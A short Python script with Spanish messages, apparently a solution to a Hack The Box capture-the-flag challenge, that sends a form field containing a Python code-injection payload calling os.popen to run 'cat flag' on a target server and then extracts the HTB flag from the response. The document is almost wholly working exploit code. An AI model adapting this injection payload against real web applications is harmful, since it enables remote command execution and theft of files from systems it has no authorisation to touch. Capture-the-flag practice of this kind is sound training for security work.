#!/usr/bin/python3
import requests, sys, signal, re

def exit_handler(sig, frame):
    print("\n[!] Saliendo de la aplicacion...")
    sys.exit(1)

#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

def main():
    try:
        data = {'ingredient': 'test', 'measurements': '__import__("os").popen("cat flag").read()'}
        r = requests.post('http://<IP-SERVER>',data=data)

        match = re.search(r'HTB\{.*?\}', r.text)

        if match:
            print(match.group(0))
        else:
            print("[!] No se encontró ninguna flag en la respuesta.")

       # print(r.text)
    except requests.exceptions.Timeout:
        print("[!] Error: Tiempo de espera agotado (Timeout).")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error en la solicitud GET: {e}")

if __name__ == '__main__':
    main()
